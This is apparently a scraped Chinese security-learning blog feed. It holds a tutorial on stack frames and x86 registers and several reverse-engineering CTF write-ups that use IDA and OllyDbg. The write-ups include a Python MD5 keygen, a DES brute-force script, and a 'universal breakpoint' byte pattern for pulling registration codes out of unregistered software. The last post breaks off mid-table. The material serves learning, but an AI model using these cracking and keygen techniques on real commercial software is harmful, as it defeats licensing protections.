      <url>/2017/07/04/%E5%A0%86%E6%A0%88%E5%8F%8A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>暑假生活开始，学习的好时间，今天就先重温一下堆栈的基础，好好巩固一下。</p>
<a id="more"></a>
<h2 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h2><p>  不同的操作系统，一个进程被分配进入的内存区域都会不同，但是无论是哪个系统，进程使用的内存按照功都同样大致分为四种：</p>
<ol>
<li>代码区:这个区域储存装入的要被执行的二进制机器代码，处理器会到这个区域获取指令并进行执行。</li>
<li>数据区:这个区域储存程序运行过程中出现的全局变量，局部变量等。</li>
<li>堆区:进程需要运行的时候，可以向这个区域申请空间，当运行结束之后空间将归还堆区，这就是堆的特点，动态分配和回收空间。</li>
<li><p>栈区:用于动态存储函数之间的调用关系，从而保证调用函数后能回到主函数中继续执行程序。</p>
<p>Windows下高级语言写出一个程序经过编译链接之后便可以生成一个可执行文件，这个可执行文件被装载运行之后便成为了所谓的进程。</p>
<p>每一个可执行程序中都包含着二进制级别的机器代码，这些代码将会被装载入代码区，处理器会一条一条的读取并运行。如果代码中有开辟动态内存的请求，则会在内存堆区中分配一个大小适合的区域给代码使用；当函数调用发生之后，栈中便会有栈帧自动保存函数的调用关系信息，以便于函数调用结束能回到主函数继续执行程序。</p>
<p>栈帧:C语言中，栈中的栈帧对应着未运行完成的函数，并且是一一对应，栈帧从逻辑上理解就是一个函数执行的环境:函数的参数，函数的变量，函数的返回地址等。<br>在函数栈帧中，一般包含如下几类重要信息。</p>
</li>
</ol>
<ul>
<li>局部变量:为函数局部变量开辟内存空间。</li>
<li>栈帧状态值:保存前栈帧的顶部和底部，用于在本栈弹出后可以恢复上一个栈帧。</li>
<li>函数返回地址:保存当前函数调用前的“断点”信息，也就是函数调用前的指令的位置，以便在函数返回时能回到调用的代码区中继续执行命令。</li>
</ul>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>  假设一个如下的简单函数：</p>
<pre><code>int func_B(int a,int b)
{
  int i,j;
  i = a + b;
  j = a - b;
  return i * j;
}
int func_A(int c,int d)
{
  int t;
  t = func_B(c,d)+c;
  return t;
}
int main()
{
  int main;
  main=func_A(4,3);
  return main;
}
</code></pre><p>  函数在进行函数调用在栈中的操作如下：</p>
<ol>
<li>在main函数调用func_A的时候，首先在自己的栈帧中压入函数返回地址，然后为func_A创建新的栈帧并压入栈</li>
<li>在func_A调用func_B的时候，同样先在自己的栈帧中压入函数返回地址，然后为func_B创建新的栈帧并压入栈</li>
<li>在func_B返回时候，func_B专属的栈帧呗弹出统栈，这样就露出func_A的返回地址，这样就直接执行这个地址返回func_A中继续执行</li>
<li>在func_A返回时候，func_A专属的栈帧呗弹出统栈，这样就露出main的返回地址，这样就直接执行这个地址返回main中继续执行。</li>
</ol>
<center><img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fh7povczmjj30mr0cs74f.jpg" alt=""></center>

<p>  注意：在实际运行中，main函数并不是第一个被调用的函数，程序被装入内存前还有一些其他的操作。</p>
<p>函数调用本身的大体步骤如下：(这个对于后面pwn的学习中payload的构造有关键作用)</p>
<ol>
<li>参数入栈：将参数从右向左依次压入系统栈中。</li>
<li>返回地址入栈：将当前代码去调用指令的下一条指令地址压入栈中，供函数返回时继续执行。</li>
<li>代码区跳转：处理器从当前代码区跳转到被调用的入口处。</li>
<li>栈帧调整：(1)保存当前栈帧的状态值，以备后面恢复本栈帧时使用（EBP入栈）。<br>(2)将当前栈帧切换到新栈帧(将ESP值装入EBP，更新栈帧底部。)  </li>
</ol>
<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p> 在汇编语言当中，主要是四类寄存器。</p>
<ol>
<li>4个数据寄存器（EAX，EBX，ECX，EDX）。</li>
<li>2个变址寄存器（ESI，EDI）、2个指针寄存器（ESP、EBP）</li>
<li>6个端寄存器（ES、CS、SS、DS、FS、GS）</li>
<li>1个指令指针寄存器（EIP）、一个标志寄存器（EFlags）</li>
</ol>
<h3 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h3><center><img src="http://otc7tld02.bkt.clouddn.com/%E5%AF%84%E5%AD%98%E5%99%A8.png" width="500" hight="500" alt=""></center>

<h4 id="1-数据寄存器"><a href="#1-数据寄存器" class="headerlink" title="(1). 数据寄存器"></a>(1). 数据寄存器</h4><p>  数据寄存器主要用来保存操作数以及运算结果，这样就便于节省读取操作数的时间。<br>  32位CPU4个32位通用的寄存器EAX，EBX，ECX，EDX。他们只会对低16为数据进行存储，不会影响高16位的数据。这低16位的寄存器又被称为AX、BX、DC、CX。与先前的CPU寄存器相一致。</p>
<ul>
<li>EAX：累加寄存器，用于加减乘除的操作，也用于存储函数的返回值。使用频率非常高。</li>
<li>EBX：基址寄存器，作为存储器指针来用。</li>
<li>ECX：计数寄存器，在循环和字符串操作时，用他来计数；在位操作是，要用CL来指明移位的位数。</li>
<li>EDX：数据寄存器，在进行乘除运算时，它可作为默认的操作数进行操作。</li>
</ul>
<h4 id="2-变址寄存器"><a href="#2-变址寄存器" class="headerlink" title="(2). 变址寄存器"></a>(2). 变址寄存器</h4><p>  32位CPU有两个32位通用的变址寄存器ESI和EDI，与前者一样，只对低16位数据进程存取。</p>
<ul>
<li>ESI：在内存操作指令中作为源地址指针使用，处理字符串时候通常指向源串。</li>
<li>EDI：在内存操作指令中作为目的地址指针使用，处理字符串时候通常指向目标串。</li>
</ul>
<h4 id="3-指针寄存器"><a href="#3-指针寄存器" class="headerlink" title="(3). 指针寄存器"></a>(3). 指针寄存器</h4><p>EBP和ESP就是指针寄存器，主要用于存放堆栈内储存单元的偏移量，用他们可以实现多种寄存器储存操作数的寻址方式。</p>
<ul>
<li>EBP: 基地址寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的底部。通过它减去一定偏移量对栈中元素进行访问。</li>
<li>ESP：栈指针寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的顶部。</li>
</ul>
<h4 id="4-段寄存器"><a href="#4-段寄存器" class="headerlink" title="(4). 段寄存器"></a>(4). 段寄存器</h4><p>段寄存器是根据内存分段的模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问的较大物理空间的内存地址。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A83.png" width="400" hight="400" alt=""></center>

<ul>
<li>CS（Code）:  代码段寄存器，其值为代码段的段值</li>
<li>DS（Date）:  数据段寄存器，其值为数据段的段值</li>
<li>ES（Extra）: 附加段寄存器，其值为附加数据段的段值</li>
<li>SS（Strack）:堆栈段寄存器，其值为堆栈段的段值</li>
<li>FS（Flag）:  标志段寄存器，其值为附加数据段的段值</li>
<li>GS（Global）:全局段寄存器，其值为附加数据段的段值</li>
</ul>
<p>8086 CPU依赖其内部的四个段寄存器实现寻址1M字节物理地址空间。8086把1M字节地址空间划分为若干逻辑段，当前使用段的段值存放在段寄存器中。由段寄存器和段内偏移形成20位地址。</p>
<p>汇编中表示：</p>
<center><font color="red"><strong>段值：偏移</strong></font></center>

<p>计算方法：</p>
<center><font color="red"><strong>物理地址 = 段值×16 + 偏移</strong></font></center>

<p>举个<img src="http://otc7tld02.bkt.clouddn.com/%E4%BE%8B%E5%AD%90.png" width="30" hight="30" alt=""></p>
<p>用16进制表示的逻辑地址1234：3456H所对应的存储单元的物理地址为15796H。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/15796%E8%AE%A1%E7%AE%97.png" width="300" hight="300" alt=""></center>



<h4 id="5-指令指针寄存器"><a href="#5-指令指针寄存器" class="headerlink" title="(5). 指令指针寄存器"></a>(5). 指令指针寄存器</h4><ul>
<li>EIP：存放个下一次将要执行的指令在代码段中的偏移量。</li>
</ul>
<h4 id="6-标志寄存器"><a href="#6-标志寄存器" class="headerlink" title="(6). 标志寄存器"></a>(6). 标志寄存器</h4><p>8086 CPU中有一个16位的标志寄存器，包含了9个标志，主要用于反映处理器的状态和运算结果的某些特征。</p>
<p>9个标志寄存器可以分为两组，第一组6个标志寄存器主要受加减运算和逻辑运算结果的影响，称为运算结果标志，第二组标志不受运算结果的影响，称为状态控制标志。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/9%E6%A0%87%E5%BF%97%E4%BD%8D%E5%88%86%E4%B8%A4%E7%BB%84.png" alt=""></center>

<h5 id="1-进位标志CF-Carry-Flag"><a href="#1-进位标志CF-Carry-Flag" class="headerlink" title="1.    进位标志CF(Carry Flag)"></a>1.    进位标志CF(Carry Flag)</h5><p>   进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。</p>
<h5 id="2-奇偶标志PF-Parity-Flag"><a href="#2-奇偶标志PF-Parity-Flag" class="headerlink" title="2. 奇偶标志PF(Parity Flag)"></a>2. 奇偶标志PF(Parity Flag)</h5><p>   奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值1，否则其值为0  </p>
<h5 id="3-辅助进位标志AF-Auxiliary-Carry-Flag"><a href="#3-辅助进位标志AF-Auxiliary-Carry-Flag" class="headerlink" title="3. 辅助进位标志AF(Auxiliary Carry Flag)"></a>3. 辅助进位标志AF(Auxiliary Carry Flag)</h5><p>   在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>   (1)、在字操作时，发生低字节向高字节进位或借位时；<br>   (2)、在字节操作时，发生低4位向高4位进位或借位时。</p>
<h5 id="4-零标志ZF-Zero-Flag"><a href="#4-零标志ZF-Zero-Flag" class="headerlink" title="4. 零标志ZF(Zero Flag)"></a>4. 零标志ZF(Zero Flag)</h5><p>   零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位</p>
<h5 id="5-符号标志SF-Sign-Flag"><a href="#5-符号标志SF-Sign-Flag" class="headerlink" title="5. 符号标志SF(Sign Flag)"></a>5. 符号标志SF(Sign Flag)</h5><p>   符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1  </p>
<h5 id="6-溢出标志OF-Overflow-Flag"><a href="#6-溢出标志OF-Overflow-Flag" class="headerlink" title="6. 溢出标志OF(Overflow Flag)"></a>6. 溢出标志OF(Overflow Flag)</h5><p>   溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0（“溢出”和“进位”是两个不同含义的概念）</p>
<h5 id="7-中断允许标志IF-Interrupt-enable-Flag"><a href="#7-中断允许标志IF-Interrupt-enable-Flag" class="headerlink" title="7. 中断允许标志IF(Interrupt-enable Flag)"></a>7. 中断允许标志IF(Interrupt-enable Flag)</h5><p>   中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下<br>   (1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；<br>   (2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求</p>
<h5 id="8-追踪标志TF-Trap-Flag"><a href="#8-追踪标志TF-Trap-Flag" class="headerlink" title="8. 追踪标志TF(Trap Flag)"></a>8. 追踪标志TF(Trap Flag)</h5><p>   当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。</p>
<h5 id="9-方向标志DF-Direction-Flag"><a href="#9-方向标志DF-Direction-Flag" class="headerlink" title="9. 方向标志DF(Direction Flag)"></a>9. 方向标志DF(Direction Flag)</h5><p>   方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。具体规定在第5.2.11节——字符串操作指令——中给出。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%A0%87%E8%87%B4%E5%AF%84%E5%AD%98%E5%99%A8.png" width="400" hight="300" alt=""></center>

<h3 id="2-主要指令"><a href="#2-主要指令" class="headerlink" title="2. 主要指令"></a>2. 主要指令</h3><p> 汇编中的指令可以参照这个网址进行学习（也涉及了上面的寄存器知识点）：<br>  <a href="http://www.freebuf.com/news/others/86147.html" target="_blank" rel="external">http://www.freebuf.com/news/others/86147.html</a></p>
<p> 在参加夏令营跟着读汇编呢也遇到了一些难以理解的内容：</p>
<p>  movsb：即字符串传送指令，这条指令按字节传送数据。通过SI和DI这两个寄存器控制字符串的源地址和目标地址，比如DS:SI这段地址的N个字节复制到ES:DI指向的地址，复制后DS:SI的内容保持不变。</p>
<p>  cld:（CLear Direction flag）则是清方向标志位，也就是使DF的值为0，在执行串操作时，使地址按递增的方式变化，这样便于调整相关段的的当前指针。这条指令与STD（SeT Direction flag）的执行结果相反，即置DF的值为1。</p>
<p>  Rep:指令就是“重复”的意思，术语叫做“重复前缀指令”，因为既然是传递字符串，则不可能一个字（节）一个字（节）地传送，所以需要有一个寄存器来控制串长度。这个寄存器就是CX，指令每次执行前都会判断CX的值是否为0（为0结束重复，不为0，CX的值减1），以此来设定重复执行的次数。因此设置好CX的值之后就可以用REP MOVSB了。</p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 堆栈及汇编基础 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[定一个小目标]]></title>
      <url>/2017/06/26/%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%9B%AE%E6%A0%87/</url>
      <content type="html"><![CDATA[<p>这是一个小目标。</p>
<a id="more"></a>
<p>今天，算是我的blog的第二个生日吧，在2016第一次搭建成功之后便在没有怎么管理过它，只是僵硬的往上传一些做题的writeup，那为什么还要搭建它，直接做一个笔记不就好了?</p>
<p>上周的聚会中和已经工作的学长作了一次深入的交谈，让我了解到了blog的重要，好好对待，它也许能助你成功，不好好对待它也就是一个高级一点的笔记本，恐怕也只有你自己能够进行阅读，毫无意义。</p>
<p>从前天开始对我的blog进行了主题修改，对一些小功能进行了完善，自行添加了一些小的插曲，自此，要求不高，多多上传一些自己的见解，把blog利用起来，学习之路还要继续向前。</p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 8之PEiD插件]]></title>
      <url>/2017/02/16/practice-8%E4%B9%8BPEiD%E6%8F%92%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>第八题</p>
<a id="more"></a>
<p>PEiD有一个叫做Krypto ANALyzer的插件，使用这个插件可以对程序进行扫描，通过特征匹配来识别程序内部可能用到的一些标准算法。</p>
<p>先看题目，随便输入就会报错。<br><img src="http://otc7tld02.bkt.clouddn.com/h81.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/h82.png" alt=""></p>
<p>利用IDA找到关键点这些烂熟于心的步骤就不再提了，对下面这段关键算法分析完了之后发现关键函数是sub_401510,但是点开这个函数，真的是好长的一大串，</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h83.png" alt=""></p>
<p>用PEid的插件进行分析，提示这个程序用了 MD5算法。<br><img src="http://otc7tld02.bkt.clouddn.com/h84.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/h85.png" alt=""></p>
<p>根据提示地址，在IDA反汇编指示图按下G，输入00401E5C,就会自动跳转到函数代码中<br><img src="http://otc7tld02.bkt.clouddn.com/h86.png" alt=""></p>
<p> 可以从sub_401D10回溯到sub_4026F0，继续通过交叉引用往上回溯，依次为sub_4027B0、sub_401C00、sub_401BB0、sub_401510，而sub_401510就是我们在实验步骤一种为一个暂时不理解的函数。那么我们可以猜测sub_401510这个函数就是用来计算用户名的MD5值的，我们可以通过OD动态调试来验证我们的想法。</p>
<p>通过阅读IDA中的反汇编代码，我们知道在00401752处调用了sub_401510这个函数，<br><img src="http://otc7tld02.bkt.clouddn.com/h87.png" alt=""></p>
<p>OK使用OD载入在00401752设置断点，输入test，直接跳转到执行sub_401510，看到eax寄存器值正好是test的MD5值<br><img src="http://otc7tld02.bkt.clouddn.com/h88.png" alt=""></p>
<p>这里说明插件判别是正确的正好使用python写一个MD5的注册机</p>
<pre><code>#!usr/bin/python
#-*- coding:utf-8 -*-
import hashlib
while True:     
username = raw_input(&quot;input username:&quot;)     
md5 = hashlib.md5(username).hexdigest().upper()     
serial = md5[::-1]  # 翻转字符串     
print &quot;serial: %s&quot; % serial
</code></pre>]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 7之行为分析]]></title>
      <url>/2017/02/14/practice-7%E4%B9%8B%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>第七题</p>
<a id="more"></a>
<p>看完教程发现这题写起来很简单，但是我们以前是没有接触过（病毒分析）<br>而且通过这题我知道了一个在线的行为分析工具，人称，<br>在线沙箱： 网上有许多公开的在线沙箱，使用这些沙箱提供的服务，我们可以方便的观察一个程序的详细行为报告，进而判断一个程序大致的内部逻辑。</p>
<p>病毒是个img文件，无法执行的文件，可以使用7zip打开如图，看看文件内部隐藏了些什么。<br><img src="http://otc7tld02.bkt.clouddn.com/h71.png" alt=""></p>
<p>打开会发现如图文件：一个游戏这时便出现误区，难道是玩游戏过关吗？<br>看下面的文件，用记事本打开，是提示，游戏有后门<br><img src="http://otc7tld02.bkt.clouddn.com/h72.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/h73.png" alt=""></p>
<p>打开游戏最上面一行亮了，我去。<br><img src="http://otc7tld02.bkt.clouddn.com/h74.png" alt=""></p>
<p>继续用7zip试着打开，果然里面还有东西，<br>我们发现里面有三个文件，分别为1.vbs、1.exe、2.exe，如下图所示：<br>第二个是游戏第一个打开知识闪过了指令框，猜测这可能就是所谓的“病毒文件”<br><img src="http://otc7tld02.bkt.clouddn.com/h75.png" alt=""></p>
<p>用在线沙箱分析来加快我们的分析流程，看看1.exe都有哪些行为特征。 打开金山火眼<a href="https://fireeye.ijinshan.com/" target="_blank" rel="external">https://fireeye.ijinshan.com/</a>，注册一个账号并激活，点击“分析文件”上传1.exe进行分析，等待一段时间就可以看到分析报告了。<br><img src="http://otc7tld02.bkt.clouddn.com/h76.png" alt=""></p>
<p>从分析报告中我们可以看出，1.exe释放了一个test.txt文件到当前目录，而且把test.txt的文件属性设置为系统和隐藏，因此我们看不到文件夹里面多了一个txt文件。现在使用记事本打开这个test.txt文件，文件内容为（WdubQ4IGEzAG54NfATJTNhI4TLIvPvENyTLLWb3YCNBeK5wad5XCgrSQNOih1F），如图所示：<br><img src="http://otc7tld02.bkt.clouddn.com/h77.png" alt=""></p>
<p>最够根据提示信息把所得到的字符串   使用MD5计算工具，算出这个字符串的16位MD5值，为ba3c34ec7cd9c086，这就是我们要找的flag了，如图所示：<br><img src="http://otc7tld02.bkt.clouddn.com/h78.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 6之算法夹杂]]></title>
      <url>/2017/02/13/practice-6%E4%B9%8B%E7%AE%97%E6%B3%95%E5%A4%B9%E6%9D%82/</url>
      <content type="html"><![CDATA[<p>第六题</p>
<a id="more"></a>
<p>之前没做出来的一道题目，各种密码学的夹杂，看到很多.so库估计当时也没啥想法了<br><img src="http://otc7tld02.bkt.clouddn.com/h61.png" alt=""><br>很明了，对输入进行检验，过了就输出right，错了就输出wrong，分析一下check_401510这个函数。先是判断字符范围，ASCII码不能超过90。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h62.png" alt=""><br>然后取输入的前5个字符，作md5加密，如下三个函数就是实现了md5算法</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h63.png" alt=""><br>接下来就是用前五个字符的md5值的前8字节作为DES算法的key，并且采用ECB模式分组加密。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h64.png" alt=""><br>然后就是对DES加密后的结果作base64变换，v9是DES加密结果，v21保存base64结果。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h65.png" alt=""><br>最后就是和check数组比较，check数组内容即是：<br>‘OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==’</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h66.png" alt=""><br>所以采用爆破的方式去得到flag，设flag前五位为temp，并且用其md5值前8字节作为DES算法的key，当解密出来的flag前五位和temp相等时，即为flag。<br>脚本如下：（参考的大神writeup）</p>
<pre><code>import pyDes
import base64
import hashlib
import string
check = &quot;OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==&quot;
miwen = base64.b64decode(check)
count = 0
for i in string.uppercase + string.digits:
    for j in string.uppercase + string.digits:
         for k in string.uppercase + string.digits:
              for m in string.uppercase + string.digits:
                   for n in string.uppercase + string.digits:
                count = count + 1
                tmp = i+j+k+m+n
                md5_tmp = hashlib.md5(tmp).hexdigest()
                key = md5_tmp[0:16].decode(&quot;hex&quot;)
                result = pyDes.des(key)
                y = result.decrypt(miwen[:8])
                if y[0:5] == tmp:
                   print y
                if count % 10000 == 0:
                    print count
</code></pre><p>这道题目主要就是各种密码算法的交杂，在代码的分析上比较困难，即使参照writeup也很难掌握，后面还得好好在琢磨琢磨</p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice 5之万能断点]]></title>
      <url>/2017/02/12/practice-5%E4%B9%8B%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9/</url>
      <content type="html"><![CDATA[<p>第五个只能算得上是学习一个新技能–万能断点之前没听过。</p>
<a id="more"></a>
<p>给的是一个未注册版本的软件，题目要求将其注册<br><img src="http://otc7tld02.bkt.clouddn.com/h51.png" alt=""></p>
<p>乱填只能是出错误<br><img src="http://otc7tld02.bkt.clouddn.com/h52.png" alt=""></p>
<p>放入IDA用运行，然后点击输入注册码，报错之后暂停OD调试<br><img src="http://otc7tld02.bkt.clouddn.com/h53.png" alt=""></p>
<p>如下图查看user3模块<br><img src="http://otc7tld02.bkt.clouddn.com/h54.png" alt=""></p>
<p>转到这个模块下之后便开始下万能断点；查找二进制字符串（crtl+B）,然后在弹出的框内输入万能断点并将跳转处设为断点</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h55.png" alt=""></p>
<p>重新载入程序，依旧输入错误注册码（由于万能断点，在运行到弹出输入界面时，中途会多次暂停）输入结束之后便可以按F8单步步过。直到堆栈窗口出现正确的注册码<br><img src="http://otc7tld02.bkt.clouddn.com/h56.png" alt=""></p>
<p>输入检验注册成功：<br><img src="http://otc7tld02.bkt.clouddn.com/h57.png" alt=""></p>
<p>万能断点：“F3 A5 8B C8 83 E1 03 F3 A4 E8”</p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-4之IDA用法]]></title>
      <url>/2017/02/12/practice-4%E4%B9%8BIDA%E7%94%A8%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>第四题</p>
<a id="more"></a>
<p>打开是这样的，看English了解掷骰子，输入任意数字（3），我发现第一次输入三进行到下一步，但是退出重启之后在输入3则为错的，所以想要在9^5种可能中猜出随机变化的数字几率，除非脸白。，还是分析源程序得到答案吧</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h41.png" alt=""></p>
<p>用IDA打开程序。进入之后shift+f12查找关键字符串。<br><img src="http://otc7tld02.bkt.clouddn.com/h42.png" alt=""></p>
<p>找到“Nice job.here is the flag”,双击跳转过去。会看到WinMain函数（常见的C++程序函数）直接反汇编<br><img src="http://otc7tld02.bkt.clouddn.com/h43.png" alt=""></p>
<p>然后就是分析代码过程了</p>
<blockquote>
<p>v56 = std::operator&lt;&lt;<std::char_traits<char>&gt;((int)&amp;std::cout, “[*] Nice job, here is the flag: “);<br>v57 = std::operator&lt;&lt;<char,std::char_traits<char>,std::allocator<char>&gt;(v56, &amp;v88);</char></char,std::char_traits<char></std::char_traits<char></p>
</blockquote>
<p>std::operator&lt;&lt;其实就是C++中的cout&lt;&lt;,所以这边就是输出那句话之后输出v88里的字符串，所以v88就变成了解题的关键了。</p>
<p>(新学到，之前没用过)在IDA里按art+T，搜索v88，在ctrl+T 继续查找下一个</p>
<p>第一个找到的：</p>
<blockquote>
<p>std::string::operator=((std::string *)&amp;v88, &amp;byte_444240);</p>
</blockquote>
<p>这是一个赋值语句，鼠标双击byte_444240即可看到字符串的内容，选择字符串开头到00之前的所有字符，(新知识)按下shift+E导出数据，得到：<br><img src="http://otc7tld02.bkt.clouddn.com/h44.png" alt=""></p>
<p>在回到伪代码查看v88<br><img src="http://otc7tld02.bkt.clouddn.com/h45.png" alt=""></p>
<p>最后一句很明确就是find/查找v88开头是不是ebCTF字样，然后代码里唯一对v88操作的只有跟v91去异或。<br>如果不想用暴力破解得到flag的话（因为v88知道了，也就是经过异或运算就可以得到flag，所以完全可以暴破），就再查找看v91的相关语句。</p>
<p>找到<br>std::string::operator=((std::string *)&amp;v91, &amp;byte_444309);<br>同样双击byte_444309查看字符串：<br>02370F350F3C15073C302A30551237151E350151</p>
<p>与v91相关的：<br><img src="http://otc7tld02.bkt.clouddn.com/h46.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/h47z7.png" alt=""></p>
<p>第一个是跟v90异或，第二个是跟v89异或<br>所以目标再盯住v89、v90即可<br><img src="http://otc7tld02.bkt.clouddn.com/h47.png" alt=""></p>
<p>除了上面的截图，前面每次掷骰子正确之后也对v89进行了操作，容易遗漏最后v89计算出来是100</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/h48.png" alt=""></p>
<p>v90有关见上图，看看程序，不难看出v90取16<br>综上，把v91这个字符串异或v89后，再异或v90，再跟v88异或就得到flag。用python来计算：</p>
<pre><code># -*- coding:utf-8 -*-

def flag():
  v89,v90=100,16
  v91=&quot;02370F350F3C15073C302A30551237151E350151&quot;
  v88=&quot;132138153D3357472D276A73440526595C79174445771A75497D054A78746A70420271050F2208&quot;

  v91=[ord(i) for i in v91.decode(&apos;hex&apos;)]
  for i in xrange(len(v91)):
v91[i]^=v89^v90

  v88=[ord(i) for i in v88.decode(&apos;hex&apos;)]
  res=&quot;&quot;
  for i in xrange(len(v88)):
res+=chr(v88[i]^v91[i%len(v91)])
  print res
  pass

if __name__ == &apos;__main__&apos;:
  flag()
</code></pre>]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-3之pyo学习]]></title>
      <url>/2017/02/10/practice-3%E4%B9%8Bpyo%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>第三题：</p>
<a id="more"></a>
<p><img src="http://otc7tld02.bkt.clouddn.com/han21.png" alt=""></p>
<p>下载下来是个这个名字的题目，也不像之前遇到的后缀里虽然杂乱也存在正确后缀的，于是想到一个格式分析工具，拖进去看看是一个pyo格式文件，回想一下以前也没见过这种格式的题目，百度一下知道这种格式其实与pyc一样，都是将py程序编译成可执行程序。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han22.png" alt=""></p>
<p>知道格式之后先改后缀，然后转换格式<br>再用python2.7下的反编译工具unompyle把这个题目的源代码弄出来</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han23.png" alt=""></p>
<pre><code>#!usr/bin/python
#-*- coding:utf-8 -*-
import sys
lookup = [196,
 153,
 149,
 206,
 17,
 221,
 10,
 217,
 167,
 18,
 36,
 135,
 103,
 61,
 111,
 31,
 92,
 152,
 21,
 228,
 105,
 191,
 173,
 41,
 2,
 245,
 23,
 144,
 1,
 246,
 89,
 178,
 182,
 119,
 38,
 85,
 48,
 226,
 165,
 241,
 166,
 214,
 71,
 90,
 151,
 3,
 109,
 169,
 150,
 224,
 69,
 156,
 158,
 57,
 181,
 29,
 200,
 37,
 51,
 252,
 227,
 93,
 65,
 82,
 66,
 80,
 170,
 77,
 49,
 177,
 81,
 94,
 202,
 107,
 25,
 73,
 148,
 98,
 129,
 231,
 212,
 14,
 84,
 121,
 174,
 171,
 64,
 180,
 233,
 74,
 140,
 242,
 75,
 104,
 253,
 44,
 39,
 87,
 86,
 27,
 68,
 22,
 55,
 76,
 35,
 248,
 96,
 5,
 56,
 20,
 161,
 213,
 238,
 220,
 72,
 100,
 247,
 8,
 63,
 249,
 145,
 243,
 155,
 222,
 122,
 32,
 43,
 186,
 0,
 102,
 216,
 126,
 15,
 42,
 115,
 138,
 240,
 147,
 229,
 204,
 117,
 223,
 141,
 159,
 131,
 232,
 124,
 254,
 60,
 116,
 46,
 113,
 79,
 16,
 128,
 6,
 251,
 40,
 205,
 137,
 199,
 83,
 54,
 188,
 19,
 184,
 201,
 110,
 255,
 26,
 91,
 211,
 132,
 160,
 168,
 154,
 185,
 183,
 244,
 78,
 33,
 123,
 28,
 59,
 12,
 210,
